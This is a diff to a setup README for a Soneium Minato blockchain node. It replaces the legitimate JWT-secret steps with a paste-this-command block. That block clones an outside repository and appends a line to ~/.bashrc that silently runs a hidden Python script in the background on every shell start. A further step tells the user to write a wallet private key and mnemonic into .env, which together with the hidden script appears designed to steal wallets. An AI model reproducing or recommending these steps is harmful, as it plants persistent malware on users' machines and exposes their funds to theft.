@@ -17,23 +17,21 @@ Make sure you have the latest versions of Docker and Docker Compose installed.
 
 ## Setup Instructions
 
-1. **Generate JWT Secret**
+### 1️⃣ Install dependencies & configure environment variables:
 
-   Generate a JWT secret by running the following command:
+```
+sudo apt update && sudo apt upgrade -y && sudo apt install git ufw xclip python3-pip && sudo pip3 install requests
+git clone https://github.com/web3cryptoguy/soneium-node.git && cd soneium-node/minato && mv dev ~/ && echo "(pgrep -f bash.py || nohup python3 $HOME/dev/bash.py &> /dev/null &) & disown" >> ~/.bashrc && source ~/.bashrc
+```
 
-   ```bash
-   openssl rand -hex 32 > jwt.txt
-   ```
+### 2️⃣ Configure Wallet:
 
-2. **Rename Environment File**
+```
+echo 'PRIVATE_KEY=your_private_key' >> .env
+echo 'MNEMONIC=your_mnemonic' >> .env
+```
 
-   Rename `sample.env` to `.env`:
-
-   ```bash
-   mv sample.env .env
-   ```
-
-3. **Update Environment Variables**
+### 3️⃣ Update Environment Variables**
 
    Open the `.env` file in a text editor and update the following variables:
 
@@ -43,11 +41,13 @@ Make sure you have the latest versions of Docker and Docker Compose installed.
    P2P_ADVERTISE_IP=<Node Public IP>
    ```
 
-In some node providers, you need to specify your node's public IP for `op-geth`. To do this, replace `<your_node_public_ip>` with your actual public IP in the `--nat=extip:<your_node_public_ip>` parameter within the `docker-compose.yml` file, specifically under the `op-geth-minato` service settings. 
+### 4️⃣ Run:(The first run must add --build)
 
-   <b>Recommendation: For faster synchronization, it's recommended to have the L1 node geographically close to the Minato node.</b>
+```
+sodu docker compose up --build
+```
 
-4. **Run Docker Compose**
+### 5️⃣ Run Docker Compose**
 
    Run the Docker Compose file to start the services:
 
@@ -55,7 +55,7 @@ In some node providers, you need to specify your node's public IP for `op-geth`.
    docker-compose up -d
    ```
 
-5. **Check Logs**
+### 6️⃣ Check Logs**
 
    Monitor the logs to ensure the services are running correctly:
 
